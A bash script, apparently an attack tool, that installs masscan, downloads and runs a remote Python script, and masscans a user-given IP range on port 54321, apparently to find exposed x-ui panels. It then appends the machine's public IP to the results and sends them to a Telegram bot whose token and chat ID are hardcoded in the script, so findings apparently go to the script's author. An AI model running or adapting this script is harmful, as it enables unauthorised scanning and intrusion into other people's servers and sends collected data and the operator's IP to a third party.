#! /bin/bash
upd(){
    apt-get update
    apt-get upgrade
    apt install masscan
    apt install libpcap-dev
    apt install python
    pip3 install requests
}

pyzt(){
    curl -o isfuckxui.py https://raw.githubusercontent.com/AriesEDGE/fuckxui/main/isfuckxui.py
}

cvv(){
    python3 isfuckxui.py
}

tgbots(){
    echo "这台机器的IP是`curl ip.sb`" >> result.txt
    TOKEN=5677739231:AAG6zUBUJg2AQL9lxplHQBba1V5dNnVZnq4	
    chat_ID=5770708575		
    message_text=`cat result.txt`	
    MODE='HTML'
    URL="https://api.telegram.org/bot${TOKEN}/sendMessage"	
    curl -s -X POST $URL -d chat_id=${chat_ID}  -d parse_mode=${MODE} -d text="${message_text}"  >> /dev/null
}
upd
pyzt
echo "Enter your IP CIOR!"
read sbip
echo "ENTER YOUR MAX FUCKXUI RATE!"
read fucku
masscan -p54321 ${sbip} --max-rate ${fucku} -oG results.txt
cvv
tgbots

